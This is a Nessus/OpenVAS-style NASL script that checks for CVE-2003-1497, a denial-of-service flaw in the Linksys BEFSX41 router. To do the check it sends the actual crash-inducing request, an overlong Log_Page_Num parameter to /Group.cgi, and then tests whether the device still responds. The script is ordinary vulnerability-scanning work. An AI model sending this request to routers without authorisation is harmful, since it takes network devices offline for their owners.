# SPDX-FileCopyrightText: 2003 Matt North
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11891");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"6.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:N/I:N/A:C");
  script_cve_id("CVE-2003-1497");
  script_name("LinkSys EtherFast Router Denial of Service Attack");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2003 Matt North");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("linksys/banner");

  script_xref(name:"URL", value:"http://www.digitalpranksters.com/advisories/linksys/LinksysBEFSX41DoSa.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/8834");
  script_xref(name:"URL", value:"http://www.linksys.com/download/firmware.asp?fwid=172");

  script_tag(name:"solution", value:"Update firmware to version 1.45.3.");

  script_tag(name:"summary", value:"The remote host seems to be a Linksys EtherFast Cable Firewall/Router.

  This product is vulnerable to a remote Denial of service attack : if logging
  is enabled, an attacker can specify a long URL which results in the router
  becoming unresponsive.");

  script_tag(name:"affected", value:"Linksys EtherFast Cable/DSL Firewall Router BEFSX41 (Firmware
  1.44.3) is known to be affected. Other versions or products might be affected as well.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);
if(http_is_dead(port:port)) exit(0);

banner = http_get_remote_headers(port:port);
if(! banner || "linksys" >!< banner) exit(0);

req = http_get(port: port, item: "/Group.cgi?Log_Page_Num=1111111111&LogClear=0");
http_send_recv(port: port, data: req);

alive = open_sock_tcp(port);
if (!alive) security_message(port:port);
